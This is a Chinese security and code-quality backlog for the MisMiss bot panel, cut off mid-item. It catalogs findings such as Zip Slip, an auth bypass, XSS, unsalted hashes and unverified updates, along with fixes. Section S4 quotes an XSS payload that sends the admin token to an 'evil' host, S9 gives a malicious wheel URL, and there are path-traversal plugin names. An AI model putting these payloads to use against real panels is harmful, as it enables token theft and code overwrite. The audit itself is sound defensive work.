# MisMiss 待实现任务清单

> 基于 MIST 接口规范与当前实现对比，按重要/紧急程度分级。
> 最近校对：2026-09-16（对照 dev 分支 v1.2.0 之后 + 全仓优化审查）
>
> **编号约定**：`S*` 安全 · `C*` 正确性与数据一致性 · `P*` 性能 · `Q*` 代码质量。
> 编号稳定，可直接用于沟通与提交信息（如 `fix(security): S1 插件解压 Zip Slip`）。
>
> **复核标记**：`🔍已复核` 表示审查时已逐行走通代码链路并确认；无标记者
> 来自静态分析，实现前需再确认一次现场。

---

## 🔴 S — 安全（最高优先）

> 组合风险：S1 + S2 + S4 串起来是完整的「上传恶意插件 → 窃取管理员令牌 →
> 覆写后端源码」链路，且四处改动都不大，建议第一批一起做。

### S1 🔍已复核 — 插件 zip 解压 Zip Slip + 目录穿越删除

- [ ] 修复 `_extract_archive` 的裸 `extractall`
  - 位置：`src/core/plugin/plugin_manager.py:1347`（tar）/ `:1350`（zip）
  - 现状：路由层 `web/backend/api/routes/plugin.py:84` 已实现正确的
    `_safe_member_path` 防 Zip Slip，但它**只用于读元数据**；
    `plugin.py:181` 随后把**同一个 zip** 交给
    `pm.install_plugin(local_path=tmp_path)`，内部走 `_extract_archive`
    的裸 `extractall` —— 防护写在了错的层，被完全绕过
  - 影响：上传含 `../../web/backend/api/routes/update.py` 成员的 zip 即可
    任意覆写后端源码（配合 S10 或下次重启 = RCE）；tar 还可借符号链接穿透
  - 方向：把 `plugin.py:_safe_member_path` 下沉到 `core/plugin` 作为唯一实现，
    路由层与 `_extract_archive` 共用；tar 使用 `filter="data"`；
    顺带消除「同一 zip 解压两次」的浪费

- [ ] 元数据 `name` 未做字符校验，直接参与 `rmtree`
  - 位置：`src/core/plugin/plugin_manager.py:1258-1265`
  - 现状：`dir_name` 取自 zip 内 `metadata.yaml` 的 `name`
    （`_load_metadata` 仅 `.strip()`，无白名单），随后
    `dest = os.path.join(self._plugin_dir, dir_name)` → `os.path.exists` →
    `shutil.rmtree(dest)` → `shutil.copytree`
  - 影响：构造 `name: "../../src/core"` 即**先删后写**整个后端源码目录；
    且 `dir_name` 会一路传染到 `load_plugin` 的路径拼接
  - 方向：`name` 白名单校验（`^[A-Za-z0-9_\-一-鿿]+$`，拒绝 `.` `/` `\`）；
    `install_plugin` / `load_plugin` 入口用 `realpath` + `commonpath`
    断言目标仍在 `_plugin_dir` 内

### S2 🔍已复核 — 插件 UI 路由认证绕过

- [ ] 用精确前缀判定替代子串包含
  - 位置：`web/backend/main.py:149-151`
  - 现状：`if path.startswith(prefix) and "/plugin/" in path and "/ui/" in path`
    —— 只看路径里是否同时出现这两个子串，任何满足组合的路径都跳过认证
  - 影响：插件 UI 路由全部匿名可访问；插件是用户上传的第三方代码，
    其 UI 端点可读取面板数据或充作免鉴权内部代理
  - 方向：由 `PluginManager` 暴露 `is_ui_route(path)` 精确判定
    （而非在中间件里靠子串猜）；长期应让 UI 路由也要求鉴权
  - 备注：与下方「已知遗留 · 插件自带 UI 路由为匿名可访问」为同一问题，
    以本条为准

### S3 🔍已复核 — CORS 配置过宽

- [ ] 收窄 `allow_origins`
  - 位置：`web/backend/main.py:117-123`
  - 现状：注释写「开发环境允许所有来源」，但代码在**生产单端口/容器部署下
    同样生效**；`allow_origins=["*"]` + `allow_credentials=True` 组合下
    Starlette 会回显 Origin
  - 影响：任意恶意站点可带凭据跨域调用全部管理端点
  - 方向：生产部署本就不需要跨域 —— 默认去掉 CORS 中间件，
    或改为环境变量控制的白名单（待定，见文末决策项）

### S4 🔍已复核 — README/CHANGELOG 渲染 XSS

- [ ] 为 `MarkdownRenderer` 补 `rehype-sanitize`
  - 位置：`web/frontend/src/components/MarkdownRenderer.tsx:19-21`
  - 现状：`rehypePlugins={[rehypeRaw, rehypeKatex]}` —— `rehype-raw` 直接解析
    Markdown 中的原始 HTML，未配 `rehype-sanitize`
  - 影响：渲染内容来自外部（上传的插件 zip 内的 README/CHANGELOG、
    GitHub Release body）。恶意插件作者写
    `<img src=x onerror=fetch('//evil/'+localStorage.auth_token)>`
    即可窃取管理员令牌
  - 方向：加 `rehype-sanitize`（schema 放行 `img`/`a`/`code`/`table` 即可）

- [ ] 日志 ANSI 渲染的转义默认值需显式锁死
  - 位置：`web/frontend/src/pages/LogsPage.tsx:241`
  - 现状：`dangerouslySetInnerHTML={{ __html: ansi.toHtml(...) }}`；
    `ansi-to-html` 目前默认 `escapeXML: true`，**当前是安全的**
  - 风险：一旦有人关闭该选项或升级库改变默认值，弹幕内容会被回显到日志，
    立即变成可执行脚本
  - 方向：显式写 `new Convert({ escapeXML: true })` 并加注释说明原因

### S5 🔍已复核 — 密码哈希为无盐 SHA-256

- [ ] 改用带盐 KDF
  - 位置：`src/core/account/manager.py:479-489`（账户）、
    `web/backend/api/routes/auth.py:34-35`（面板管理员）
  - 现状：`hashlib.sha256(password.encode()).hexdigest()`，无盐无迭代；
    比对用普通 `==`（时序侧信道）
  - 影响：`panel.json` / `auth.json` 会落盘、进备份、进 Docker 数据卷。
    泄露后弱密码秒破；无盐还意味着同密码账户哈希相同，可直接看出
  - 方向：`hashlib.scrypt`（标准库，零新依赖），存储格式带盐与参数；
    比对改 `hmac.compare_digest`；登录时命中旧格式则**透明升级**
  - 决策项：存量数据迁移方式见文末

### S6 🔍已复核 — auth.json 损坏时静默回落默认密码

- [ ] 损坏不应重置为公开已知密码
  - 位置：`web/backend/api/routes/auth.py:117-139`（`_load_auth`）
  - 现状：`except (JSONDecodeError, ValueError, OSError)` 分支直接写入
    `{"username": "MisMiss", "password": _hash("MisMiss")}`
  - 影响：一次磁盘写坏或并发写截断，面板就回落到公开已知的默认凭据
  - 方向：损坏时拒绝启动并给出明确指引，或生成**随机**密码打印到日志；
    绝不回落固定值
- [ ] 令牌文件权限加固
  - 位置：`web/backend/api/routes/auth.py:45,55-61`
  - 现状：`TOKEN_DIR` 与令牌文件均用默认权限创建，且**文件名即令牌**
  - 影响：容器内其他进程 / 多 worker 可枚举目录，冒充 admin 最长 30 天
    （`TOKEN_TTL`）
  - 方向：`os.chmod(0o700)` / `0o600`；`_save_token` 改原子写
    （临时文件 + `os.replace`）

### S7 🔍已复核 — 公共 Cookie 权限提升

- [ ] 统一「公共 Cookie ⇒ 权限降级」不变量的实现点
  - 位置：`src/core/account/manager.py:669-671`（`update_account` 的 public 分支）
  - 现状：该分支调 `await server.update_cookie(cookie)` **不传 `permissions`**，
    于是走默认分支保留原有权限；而 `switch_bot_mode:620`、
    `_start_account`、`apply_public_cookie:867-896` 三处都显式传了
    `BotPermission.SEND_LIVESTREAM_MESSAGE`
  - 影响：账户先用 private 模式把权限拉满，再调 `update_account(bot_mode="public")`
    —— 用**面板公共 Cookie** 却持有完整权限；插件权限天花板随之被抬高
  - 方向：该不变量目前有 4 个实现点、漏了 2 个。应收敛为**一处** ——
    按「cookie 是否等于公共 Cookie」在 `create_bot`/`update_cookie` 内部判定，
    而非散落在调用点

### S8 🔍已复核 — 令牌经 URL 查询参数传输

- [ ] WebSocket 握手改用短时效票据
  - 位置：`web/frontend/src/hooks/useLogStream.ts:214-216`；
    服务端 `web/backend/api/routes/ws.py`
  - 现状：`ws://…/api/ws?last_seq=…&token=<30天有效期的管理员令牌>`
    （注释说明是浏览器 WebSocket 无法设 header 的无奈之举）
  - 影响：令牌进入 Uvicorn/nginx access log、浏览器历史、
    以及可能的 `Referer`
  - 方向：登录后由后端下发短时效（如 60s）、单次使用的 `ws_ticket`；
    或改用 `Sec-WebSocket-Protocol` 子协议头传递

### S9 — `pip-install` 端点实为任意包安装

- [ ] 限制安装来源
  - 位置：`web/backend/api/routes/config.py:180-202`
  - 现状：校验只拒绝 `-` 开头与长度 > 200
  - 影响：`pkg = "https://evil/evil.whl"` 或 `git+https://…` 会被 pip 直接安装，
    安装过程执行 `setup.py` / wheel 钩子 = RCE
  - 方向：包名限定 `^[A-Za-z0-9_.-]+$`（PEP 508 名称），
    拒绝 URL / VCS / 本地路径；且该调用需移出事件循环（见 P2）

### S10 🔍已复核 — 在线更新无完整性校验

- [ ] 下载后强制校验摘要
  - 位置：`web/backend/api/routes/update.py:350-367`（`_download_asset`）、
    `:588-595`（`update_settings`）
  - 现状：`repo` / `mirror` / `proxy` 三个字段**全部由请求体直接控制**，
    无格式校验；下载内容 0 校验；`_verify_docker_package` 只看文件名与
    `manifest.json` 是否存在
  - 影响：把 `mirror` 指向攻击者服务器，之后每次「官方更新」都从该处下载，
    解压覆盖 `PROJECT_ROOT`，再 `docker load` + 重建容器 = 完整 RCE 链
  - 方向：使用 GitHub API 的 `assets[].digest` 或独立 `.sha256` 文件强制比对，
    不匹配即中止；`repo` 校验 `^[\w.-]+/[\w.-]+$`；`mirror`/`proxy` 强制
    https 且限制可信域
- [ ] 源码更新流程改为 staging + 原子切换
  - 位置：`web/backend/api/routes/update.py:657-691`
  - 现状：先 `copytree` 全量备份，再**原地解压覆盖**
  - 影响：解压到一半失败（磁盘满 / 包损坏 / 进程被杀）→ 应用处于
    `src/` 半新半旧的不可运行状态，**且无自动回滚**
  - 方向：解压到 `.staging-<ver>/`，校验完整后用 `os.replace` 切换；
    失败自动从 backup 恢复；`_SKIP_OVERWRITE` 扩展到 `data/`、`.env`、
    `plugins/`（用户插件不应被更新包覆盖）

### S11 — 插件数据目录沙箱不解析符号链接

- [ ] 用 `realpath` 替代字符串前缀比较
  - 位置：`src/core/plugin/data_manager.py:138-151`
  - 现状：`os.path.normpath` + `startswith` 做校验，`__init__` 用 `abspath`
    而非 `realpath`
  - 影响：插件源码若携带指向 `/etc` 的软链接，`read_text("link/passwd")`
    字符串前缀合法但实际落到链接目标；`delete("link")` 会 `rmtree` 到链接目标。
    Windows 上还存在大小写敏感误判与 NTFS 备用数据流（`a.txt:evil`）问题
  - 方向：`realpath` 校验 + Windows 下 `normcase` 比较 + 拒绝 `:` / `\x00`；
    严格场景用 `O_NOFOLLOW`

### S12 — 已禁用插件的模块顶层代码仍被执行

- [ ] `set_app` 补充 `enabled` 检查
  - 位置：`src/core/plugin/plugin_manager.py:196-209`（`set_app`）→
    `_ensure_plugin_loaded`
  - 现状：`set_app` 只检查 `ui_schema_path`，**不检查 `metadata.enabled`**，
    便同步导入模块并实例化
  - 影响：被管理员禁用的插件，其 `main.py` 顶层代码（含 `register_routes`、
    建连接、起线程等副作用）每次启动仍完整执行；且该路径的
    `except Exception` 只记日志，损坏模块会被静默吞掉
  - 方向：`if not meta.enabled: continue`；异常记入 `_failed_plugins`

---

## 🟠 C — 正确性与数据一致性

### C1 🔍已复核 — panel.json 并发写竞态

- [ ] 固定 `.tmp` 名 + 全量覆写 + 无锁
  - 位置：`src/core/account/manager.py:168`（`_save_panel`）
  - 失败场景：账户自助 `redeem` 在 `await resume_after_renew()`（含网络
    I/O）处让出事件循环；管理员并发改凭据触发 `_save_panel`。
    两者先后打开**同一个** `panel.json.tmp`，前者恢复后写回的是自己那份
    过期快照 —— 管理员刚设的密码被静默回滚。两个 `_save_panel` 同时
    以 `"w"` 打开同一 tmp 时，后 `replace` 者还会 `FileNotFoundError`
  - 方向：`asyncio.Lock` 串行化「序列化 + 写盘」；tmp 名带
    `pid + token_hex` 随机后缀；`_apply_renewal` 内多次 `_save_panel`
    合并为一次

### C2 🔍已复核 — `_ensure_state_fresh` 的部分同步被当成全量同步

- [ ] 补齐同步字段或改为乐观锁
  - 位置：`src/core/server.py:318`（mtime 判定）、`:869-900`（`_save_state`）
  - 现状：`_ensure_state_fresh` 只同步 Bot / 直播间 / 插件启用标志，
    **不同步 `timer_messages` 与 `timer_interval`**；而 `_save_state`
    在覆写前先调它当作前置
  - 失败场景：worker A 刚 `register_timer_message` 写盘，worker B 处理一次
    `bot/enable` 时 `_save_state` 看到 mtime 变了、重读、只更新了 bot 标志，
    然后把**自己内存里不含新定时消息的 `timer_messages`** 整体写回 ——
    定时消息永久丢失
  - 附带：`os.path.getmtime` 在 FAT/exFAT/部分网络文件系统只有 1–2 秒精度，
    同秒内写入被判「未变化」，跨 worker 同步静默失效
  - **实测数据（2026-09-16，Windows/NTFS）**：连续写同一文件 300 次，
    其中 **266 次（89%）的 `getmtime` 与上一次完全相同**（平均每次写仅 113µs，
    快于文件系统时间戳更新粒度）→ `if current_mtime <= self._state_mtime: return`
    在紧邻的两次写入之间几乎必然误判为「未变化」
  - **可复现的连带后果**：`test/test_cross_worker_sync.py` 因此**长期不稳定**——
    在 HEAD 上重复运行 20 次仅通过 13 次（约 65%），失败点随机落在
    PASS 4（Bot 启用同步）或 PASS 6（直播间停用同步）。
    该测试失败**不代表功能回归**，需先修本缺陷才能让它稳定
  - 方向：state 加单调递增 `revision` 字段替代 mtime；`_save_state` 改为
    读-改-写，只覆盖本 worker 拥有的字段
  - 备注：单 worker 部署（`MISMISS_WORKERS=1`，当前默认）下不受影响，
    因为它根本不需要跨 worker 同步（亦见 P1）

### C3 🔍已复核 — 替换 `self._bot` 时不清旧后台任务

- [ ] 替换前 cancel 旧任务
  - 位置：`src/core/server.py:338-347`
  - 现状：`_ensure_state_fresh` 发现「Bot 已被其他 worker 删除」时，
    直接 `self._bot = MissevanBot("", …)`，**不调用旧 bot 的
    `_timer_task.cancel()` / `_consumer_task` 清理**，也不修正
    `_livestreams` 里各 `live._bot` 的指向
  - 失败场景：旧 `_run_timer` 携旧 `_global_timer_cycle` 继续
    `await asyncio.sleep()` 并继续发消息，新 bot 也有自己的循环 →
    **消息翻倍**；且该函数是同步的、在几乎每个账户级请求里被调用
  - 方向：抽出 `async def _reset_bot()`，或至少同步 cancel 旧任务；
    把 bot 替换挪到异步的 `_ensure_bot_restored` 路径

### C4 — Bot 后台任务无关闭路径

- [ ] 增加 `MissevanBot.close()`
  - 位置：`src/core/server.py:191-198`（`shutdown`）、
    `src/core/bot/mis_bot.py:301,1053`（`_timer_task` / `_consumer_task`）
  - 现状：`shutdown()` 只 `terminate` 插件并置 `self._bot.enabled = False`，
    两个后台任务**无人 cancel**；`_run_timer` 的循环条件
    `while self._has_any_timer_messages()` **不含 `enabled`**
  - 失败场景：账户到期 → 插件被挂起但 `_timer_task` 仍活着；
    队列非空时它会持续存在到进程退出。CLI 长驻模式下表现为
    **关闭服务器后定时消息仍在发送**
  - 方向：`MissevanBot.close()` cancel 并 await 两个 task；
    `shutdown()` 调用它；`_run_timer` 循环条件补 `and self._enabled`

### C5 — 插件激活无锁，可创建两个实例

- [ ] 激活/停用/重载路径串行化
  - 位置：`src/core/plugin/plugin_manager.py:1021-1040`（`resume_plugin`），
    同类还有 `enable_plugin` / `disable_plugin` / `uninstall_plugin`
  - 现状：全部直接读写 `self._plugins`，**无锁**；靠
    `plugin_instance is None` 推断「未激活」
  - 失败场景：两个浏览器标签页同时点「启用」→ 两个协程都看到
    `plugin_instance is None`，都走 `_activate_plugin`：第二次命中
    `sys.modules` 缓存拿到**同一模块对象**，但各自 `Plugin(**kwargs)`
    创建**两个独立实例**并都 `register_new_event` → 每条弹幕处理两次；
    `metadata.plugin_instance` 被后写者覆盖，前一个实例永久泄漏
    （`terminate` 永不执行）
  - 方向：per-plugin `asyncio.Lock`；把「激活中」作为显式状态而非靠
    `None` 推断

### C6 — `reload_plugin` 失败导致插件从列表中消失

- [ ] 失败时回滚而非丢条目
  - 位置：`src/core/plugin/plugin_manager.py:767-796`
  - 现状：`del self._plugins[plugin_name]` 在前，`await self.load_plugin()`
    在后；异常直接冒泡
  - 失败场景：用户把 `metadata.yaml` 改坏 → 旧条目已删、旧实例已拆、
    `load_plugin` 抛异常且**不进 `_failed_plugins`** → 插件在面板上凭空
    消失，无法从「失败插件」列表重试，只能重启
  - 附带：恢复时只写回 `enabled`，`initialized` / `routes_registered` /
    `_disabled_plugins` 状态未同步
  - 方向：先存 backup 再删；`try/except` 失败时回滚旧 metadata 并记入
    `_failed_plugins`；显式迁移三项状态

### C7 — `suspend_plugin` 的 fire-and-forget terminate 竞态

- [ ] 让挂起与恢复有明确时序
  - 位置：`src/core/plugin/plugin_manager.py:997-1010`
  - 现状：`loop.create_task(metadata.plugin_instance.terminate())`，
    随后同步执行 `_purge_plugin_timers()`；`metadata.enabled` 仍为 `True`
  - 失败场景：`suspend_all()` 后立即 `resume_all()`（账户重载流程就是
    `shutdown_all` + `start_all`），上一次的 `terminate()` 可能还没跑完，
    与本次 `on_enable()` 并发：插件在 `terminate` 里关闭的资源被
    `on_enable` 使用，或 `terminate` 里的 `unregister_timer_messages`
    把刚注册的定时消息清掉
  - 备注：`disable_plugin:987-993` 用 `await terminate()`，同语义操作
    两种时序契约，调用方无法预期
  - 方向：`suspend_plugin` 改 `async def` 并 `await`；或把 task 存进
    metadata，在 resume 前 await

### C8 — 到期调度器停止不等待任务退出

- [ ] `stop()` 改异步并 await
  - 位置：`src/core/account/expiry.py:24-32`
  - 现状：`self._task.cancel()` 后立即置 `None`，不 await；
    `start()` 用已废弃的 `asyncio.get_event_loop()`
  - 失败场景：`main.py:82-86` 里 `_scheduler.stop()` 后紧接着
    `await _manager.shutdown_all()`，此时 `_run()` 可能正卡在
    `await self.manager.stop_for_expiry(...)` —— 它会继续跑完，
    在 `_servers` 已清空后调 `server._save_state()`，
    把**已删除账户目录的 state 文件复活写盘**
  - 方向：`async def stop()` + `contextlib.suppress(CancelledError)` 后
    `await self._task`；`start()` 改 `get_running_loop()`；
    `tick` 入口加 `_stopping` 守卫

### C9 — 删除账户可能静默残留数据

- [ ] `purge_data` 应保证不变量
  - 位置：`src/core/account/manager.py:583-597`（`delete_account`）
  - 现状：`shutil.rmtree(..., ignore_errors=True)`，且不检查账户是否在运行
  - 失败场景：插件仍持有文件句柄（Windows 常见）时删除部分失败，接口
    仍返回 `success=True, message="账户 X 已删除"`，磁盘上残留配置、Cookie、
    插件数据。若删除是出于**合规/隐私**目的，这个后果是严重的
  - 方向：逐项删除并收集失败清单，返回结构化结果；失败时**不删记录**
    （或标记 `pending_purge` 由后台重试），保证
    「记录不存在 ⇒ 数据不存在」

### C10 — 版本比较导致插件更新静默失效

- [ ] 版本解析失败不要当成 0
  - 位置：`src/core/account/manager.py:1019-1025`（`_version_tuple`）
  - 现状：解析失败 `return (0,)`，**无日志**；版本守卫是
    `>=` 比较
  - 失败场景：库版本写成 `"1.2.3-beta"` 或 `"v1.2"`（`metadata.yaml` 手写、
    无 schema 校验）→ `(0,)`；副本版本 `"1.0.0"` → `(1,0,0) >= (0,)` 成立
    → **永远跳过，更新功能对该插件静默失效**
  - 附带：`(1,2) >= (1,2,0)` 为 `False`，即「1.2」被判为低于「1.2.0」，
    语义反了
  - 方向：对齐 padding；解析失败用哨兵值 + `_log.warning`；
    或直接用 `packaging.version.Version`

### C11 — 插件配置读-改-写丢数据

- [ ] 原子写 + per-plugin 锁
  - 位置：`src/core/plugin/config_manager.py:228-263`
    （`update_config_value`），`save_config` / `save_permissions` 同理
  - 现状：`load_config()` → 改 key → `save_config()`，无锁；
    `open(path,"w")` 先截断再写，非原子
  - 失败场景：前端对每个字段单独 POST，两个并发请求都读到同一份旧 dict，
    各自改一个键 → 后写者覆盖前者（管理员改了 A 和 B，只有最后一个生效）；
    写入中途崩溃 → JSON 截断 → 下次 `load_config` 抛
    `CorePluginConfigException`，插件直接加载失败
  - 方向：写临时文件 + `os.replace`；per-plugin 锁

### C12 — schema 新增嵌套子键不补默认值

- [ ] 「补默认值」判定改为递归
  - 位置：`src/core/plugin/config_manager.py:173-207`，
    权限侧同构于 `permission_manager.py:109-148`
  - 现状：`missing_keys = [k for k in defaults if k not in saved]`
    只看**顶层** key
  - 失败场景：schema 的 `object` 类型字段新增子键
    （如 `config["db"]["timeout"]`）→ 顶层 `"db"` 已存在 →
    `missing_keys` 为空 → **不写回** → 插件 `get_int("db.timeout")`
    拿不到新默认值
  - 附带：`_deep_merge` 在两个文件里各复制了一份
  - 方向：抽出公共 `_merge_with_defaults()`；缺失检测改为递归比较
    合并前后的差异

### C13 — 插件路由前缀提取依赖库私有属性

- [ ] 自行维护路由引用，不依赖 Starlette 内部结构
  - 位置：`src/core/plugin/plugin_manager.py:1735-1745`（`_route_prefix`），
    影响 `_insert_plugin_routes` / `_remove_plugin_routes`
  - 现状：读 `route.original_router`（Starlette 的 `_IncludedRouter` 包装），
    取不到则退化为 `route.path`
  - 失败场景：标准 `app.include_router(prefix=…)` 产生的 route **天然没有**
    该属性 → 走 `route.path` 分支 → 返回完整路径而非前缀 →
    `== prefix` 恒为 false → `removed` 恒为 0 →
    **停用/重载插件后旧路由仍响应请求**（正是该函数注释声称要修的 bug）。
    Starlette 改私有属性名时还会静默失效，表现为「重载后显示旧数据」，
    极难定位
  - 方向：注册插件路由时自己维护
    `self._plugin_routes: dict[str, list[route]]`；或改前缀匹配
    `route.path == prefix or route.path.startswith(prefix + "/")`

### C14 — 数据迁移判据可能搬走令牌并清空账户

- [ ] 迁移幂等判据改为「panel.json 存在 **或** accounts/ 非空」
  - 位置：`src/core/account/migration.py:41-45`
  - 现状：只以 `panel.json` 是否存在判断「已迁移过」，
    且 `tokens/` 在 `_LEGACY_ITEMS` 里
  - 失败场景：`panel.json` 因磁盘满/崩溃缺失，但 `data/accounts/` 数据完好
    → 判定「未迁移」→ `tokens/` 必然非空 → 被 move 到
    `data/backup/pre-multiaccount-<ts>/` → **所有用户被登出**，
    并写入空 panel → **全部账户从面板消失**（数据目录还在但导入路径不存在）
  - 方向：判据加 `data/accounts/` 非空；`tokens/` 移出 `_LEGACY_ITEMS`
    （它是新代码创建的，不属于旧单服务器运行时数据）；迁移失败时不写空 panel

### C15 — WebSocket 重连耗尽后静默停摆

- [ ] 重连失败需反映到上层状态
  - 位置：`src/core/network/websocket.py:138-157`、`:178-201`
  - 现状：超过最大重试次数后 `_run_message_loop` 直接 `return`，
    且 `_do_connect` 抛出时**不清空 `self._ws`**（仍指向已断开的旧连接）
  - 失败场景：上层若只检查 `self._ws is not None` 会误判
    `is_connected=True`，面板显示正常但**弹幕已静默停止**
  - 附带：`json.loads(raw)` 未捕获 `JSONDecodeError`，服务端发来非 JSON
    文本会让 task 异常终止
  - 方向：重连耗尽时置 `self._ws = None` 并回调上层更新状态；
    `json.loads` 包 try/except

### C16 — HTTP 客户端无连接复用

- [ ] 持有长生命周期 `AsyncClient`
  - 位置：`src/core/network/client.py:70`
  - 现状：每个请求 `async with httpx.AsyncClient(timeout=30.0)`
  - 影响：每次请求重新 TCP + TLS 握手，站点是 HTTPS，开销数百毫秒；
    定时消息每分钟一次、插件可能高频调用。同时 `_cookie` 在构造时固定
    （`:25-26`），Cookie 刷新后不生效
  - 方向：实例级持有 `AsyncClient` 并提供 `aclose()`；
    `__init__` 开放 `timeout` 等参数

---

## 🟡 P — 性能

### P1 🔍已复核 — `_ensure_state_fresh` 是纯开销

- [ ] 降级为仅在多 worker 下启用
  - 位置：`web/backend/api/deps.py:51`、`src/core/server.py:303-323`
  - 现状：**每个账户级读请求**都同步 `os.path.getmtime`；判定变化时同步
    `json.load` 整个 state（含全部定时消息）—— **阻塞事件循环**
  - 影响：单 worker（`MISSMISS_WORKERS` 默认 1）下这个调用**永远空转**
    （本 worker 是唯一写入者，mtime 比较恒为假），是纯粹为多 worker 付的税；
    多 worker 下又变成每次请求都卡整个 loop
  - 方向：仅当 `workers > 1` 时启用；命中变化时用
    `await asyncio.to_thread(...)` 移出事件循环

### P2 — 同步阻塞 I/O 直接跑在事件循环上

- [ ] 全部改 `asyncio.to_thread` / `create_subprocess_exec`
  - 位置：`update.py:299-312`（`subprocess.run`，`docker load` 最长
    600s）、`update.py:455`（`Popen`）、`update.py:669`（`copytree` 备份）、
    `config.py:195`（`pip_main`）
  - 影响：`docker load` 一个镜像动辄几十秒，期间**整个 FastAPI 事件循环
    冻结** —— 所有账户的 WebSocket 心跳、日志推送、API 请求全部停摆
  - 备注：`routes/plugin.py:171,228` 与 `ws.py:95` 已正确使用 `to_thread`，
    可作范式

### P3 — WS 日志广播串行

- [ ] 改为并发发送
  - 位置：`web/backend/api/routes/ws.py:169-186`
  - 现状：`for cid, ws in _clients.items(): await ws.send_json(...)`
  - 影响：一个慢客户端（手机弱网）阻塞整轮广播，拖慢所有其他客户端的
    日志实时性
  - 方向：`asyncio.gather(..., return_exceptions=True)` + 单客户端超时；
    附带给 `_clients` / `_client_id_seq` 补「仅在事件循环内访问」的注释
    （`_pending` 已有锁，其余靠 GIL 侥幸）

### P4 — 定时消息 Tab 每秒全树重渲染

- [ ] 倒计时改为局部更新
  - 位置：`web/frontend/src/pages/AccountDetailPage.tsx:623-624`
  - 现状：`setInterval(() => setTick(x => x+1), 1000)` 每秒重渲染整个 Tab；
    内部每条消息渲染 `MarqueeText`（含 `ResizeObserver` +
    `requestAnimationFrame` 双帧测量 + 动态注入 `<style>`）
  - 影响：20 条消息 × 每秒 = 每秒 20 次 `getBoundingClientRect`
    强制同步布局
  - 方向：倒计时改为 CSS 动画或单个 `<span>` 级局部 state

### P5 — MarqueeText 无限追加 style 规则

- [ ] 改 CSS 变量，规则不再增长
  - 位置：`web/frontend/src/components/MarqueeText.tsx:14-34`
  - 现状：`styleEl.textContent += \`@keyframes ${animationName} {...}\``
    —— 每次 `distance` 变化都生成一条**永不回收**的 keyframes 规则
  - 影响：定时消息 Tab 每秒重渲染 + 列表变化 + 窗口 resize，会让这个
    字符串无限膨胀，浏览器 CSSOM 反复解析整段文本
  - 方向：CSS 变量 + 固定 keyframes
    （`transform: translateX(calc(-1 * var(--marquee-distance)))`），
    距离只改 inline style

### P6 — 轮询不感知页面可见性

- [ ] 统一封装 `usePolling(fn, ms)`
  - 位置：`AccountsPage.tsx:45-49`（10s）、`AccountDetailPage.tsx:128`（8s）、
    `:623`（30s）、`ServerPage.tsx:32`（5s）、`AccountPortalPages.tsx:41,57`、
    `:265`（8s）、`:281`（30s）
  - 影响：切走标签页后仍全速轮询，7 处间隔散落且各自为政
  - 方向：内部用 `document.visibilityState` 暂停；间隔常量集中到
    `src/constants.ts`（与 Q13 合并处理）

### P7 — 账户总览重复全量聚合

- [ ] 复用快照或加短 TTL 缓存
  - 位置：`web/backend/api/routes/panel.py:60-63,86-89`、
    `server.py:14-25`
  - 现状：`manager.overview()` 对**每个账户**算 `_account_snapshot`，
    且在 3 个端点被各算一遍 —— 一次页面加载触发 3 次全量遍历
  - 附带：`manager.py:439-442` 在同一表达式里调用两次 `list_plugins()`，
    两次结果间若插件启停会导致前端显示 `enabled > total`
  - 方向：`overview()` 加 1–2s TTL 缓存；`panel_status` 复用结果；
    两次 `list_plugins()` 合并为一次

### P8 — 插件表格无虚拟化

- [ ] `renderCell` 提到模块顶层 + 表格虚拟化
  - 位置：`web/frontend/src/components/PluginUI.tsx:98,484`
  - 现状：`renderCell` / `renderActions` / `renderPromptDialog` 均定义在
    组件体内；`rows.map` 直接渲染，无虚拟化
  - 影响：`promptValues` 是受控输入，用户每敲一个字符 → 整棵树重渲染 →
    200 行 × 8 列 = 1600 次 `renderCell`
  - 方向：`renderCell` 提到模块顶层（不依赖组件 state）；
    prompt 弹窗拆为独立组件让输入 state 局部化；
    用已在依赖里的 `react-virtuoso` 的 `TableVirtuoso`

### P9 — 图片代理无缓存 / 无并发限制

- [ ] 加 LRU 缓存与流式响应
  - 位置：`web/backend/api/routes/proxy.py:132-164`
  - 现状：无缓存；`chunks: list[bytes]` 累积到 10MB 再 `b"".join()`
  - 影响：直播间头像/封面每次刷新都回源 CDN（明确 N+1）；大图内存尖峰；
    无并发限制可被当放大器
  - 方向：按 URL 做 LRU；`StreamingResponse` 边收边发；
    绑定已解析 IP 消除 DNS rebinding 窗口（代码注释已承认该窗口存在）

---

## 🟢 Q — 代码质量与可维护性

### Q1 — 导航定义重复 4 份，i18n 近乎死代码

- [ ] 抽出 `nav.ts` 单一来源
  - 位置：`web/frontend/src/components/Layout.tsx:18-65`
    （`mobileGroups` / `accountMobileGroups`）
    vs `Sidebar.tsx:20-68`（`adminNavGroups` / `accountNavGroups`）
  - 现状：四份重复的导航定义，唯一区别是语言 —— `Sidebar` 用 `t()`，
    `Layout` 硬编码中文
  - 影响：加一项导航要改 4 处；`i18n/zh-CN.ts` 的 401 行词条只有
    `Sidebar` 的 15 处在用，`useT()` 成为死导出
  - 方向：导航配置提取为 `nav.ts`（用 `t()` 键名而非字面量），
    `Layout` 与 `Sidebar` 共同消费

### Q2 — 权限标签重复 3 处

- [ ] 合并为单一 `PERMISSIONS` 注册表
  - 位置：`AccountDetailPage.tsx:37`（`PERM_NAMES`）、`:38`（`PERM_LABELS`）、
    `PluginDrawer.tsx:62`（`PERM_DESC`）
  - 影响：新增权限要改 3 个文件，漏改即显示空白

### Q3 — Tooltip / IconBtn 重复 6 份

- [ ] 统一用 `HoverTip`
  - 位置：`PluginLibraryPage.tsx:17-46` 与 `AccountDetailPage.tsx:1272-1301`
    各有一份逐字相同的 `IconBtn`；`HoverTip.tsx` 是第三份同类实现；
    `SettingsPage.tsx:569-575`、`Sidebar.tsx:156-165,193-201`、
    `PluginUI.tsx:826-831` 是第四至六份
  - 影响：tooltip 样式散布 6+ 文件，改一次间距要全局搜索
    （目前只有 `Button.tsx:95` 和 `SettingsPage.tsx:566` 用了 `HoverTip`）

### Q4 — 超大页面文件

- [ ] 拆分 `AccountDetailPage.tsx`（1625 行）
  - 位置：`web/frontend/src/pages/AccountDetailPage.tsx`
  - 现状：`OverviewTab` / `LiveTab` / `BotTab` / `TimerTab` / `PluginsTab` /
    `LibraryTab` / `AccountDetailPage` 挤在一个文件，
    另有 6 个私有辅助组件；`PluginUI.tsx`（955 行）同理
  - 影响：`AccountPortalPages.tsx:19-21` **反向 import** 这 6 个 Tab，
    页面文件被当组件库用；单 chunk 内 6 个 Tab 代码全部保留，
